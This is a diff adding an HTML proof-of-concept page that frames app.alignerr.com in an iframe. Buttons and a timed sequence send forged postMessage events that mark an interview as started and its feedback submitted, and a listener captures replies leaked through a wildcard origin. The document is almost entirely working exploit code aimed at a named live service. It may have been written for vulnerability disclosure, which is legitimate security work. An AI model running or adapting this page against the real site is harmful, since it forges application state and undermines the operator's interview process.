@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PoC — Clickjacking + postMessage Origin Bypass</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: monospace; background: #0f0f0f; color: #e0e0e0; display: flex; flex-direction: column; height: 100vh; }
+    #toolbar { background: #1a1a1a; border-bottom: 1px solid #333; padding: 10px 16px; display: flex; gap: 8px; align-items: center; flex-shrink: 0; }
+    h1 { color: #ff4c4c; font-size: 0.9rem; margin-right: auto; }
+    button { padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer; font-family: monospace; font-size: 0.8rem; font-weight: bold; }
+    .btn-start  { background: #16a34a; color: #fff; }
+    .btn-started{ background: #7c3aed; color: #fff; }
+    .btn-finish { background: #dc2626; color: #fff; }
+    .btn-all    { background: #b45309; color: #fff; }
+    #log { background: #111; border-top: 1px solid #222; padding: 6px 12px; font-size: 0.75rem; color: #60a5fa; flex-shrink: 0; height: 32px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    iframe { flex: 1; width: 100%; border: none; }
+  </style>
+</head>
+<body>
+
+<div id="toolbar">
+  <h1>⚠ PoC: Clickjacking + postMessage Origin Bypass — app.alignerr.com</h1>
+  <button class="btn-start"   onclick="sendMsg('INTERVIEW_CAN_START')">1 · CAN_START</button>
+  <button class="btn-started" onclick="sendMsg('INTERVIEW_STARTED')">2 · STARTED</button>
+  <button class="btn-finish"  onclick="sendMsg('INTERVIEW_FEEDBACK_SUBMITTED')">3 · FEEDBACK_SUBMITTED</button>
+  <button class="btn-all"     onclick="runFullSequence()">▶ Full Sequence</button>
+</div>
+
+<iframe id="target" src="https://app.alignerr.com/home?job-id=23932ca0-c195-4d33-8176-18f18c56a630"></iframe>
+
+<div id="log">[ready] Page loaded — use buttons above to send postMessages into the iframe.</div>
+
+<script>
+  const iframe = document.getElementById('target');
+  const log = msg => document.getElementById('log').textContent = msg;
+
+  // Also prove the outgoing wildcard leak — receive replies from alignerr.com
+  window.addEventListener('message', e => {
+    log(`← RECEIVED from ${e.origin}: ${JSON.stringify(e.data)}`);
+  });
+
+  function sendMsg(msg) {
+    iframe.contentWindow.postMessage(msg, '*');
+    log(`→ SENT: ${msg}`);
+  }
+
+  async function runFullSequence() {
+    sendMsg('INTERVIEW_CAN_START');
+    await new Promise(r => setTimeout(r, 1500));
+    sendMsg('INTERVIEW_STARTED');
+    await new Promise(r => setTimeout(r, 1000));
+    sendMsg('INTERVIEW_FEEDBACK_SUBMITTED');
+    log('✓ Full sequence complete — check iframe for navigation to /home');
+  }
+</script>
+</body>
+</html>
